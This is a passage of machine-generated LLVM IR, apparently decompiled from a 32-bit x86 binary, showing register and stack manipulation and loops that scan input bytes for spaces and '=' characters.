  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_80526d0()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_8052720(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge6, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_80526d0()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_80554e9.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_80526d0()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp143, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_80554e9.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_80526d0()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp144, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
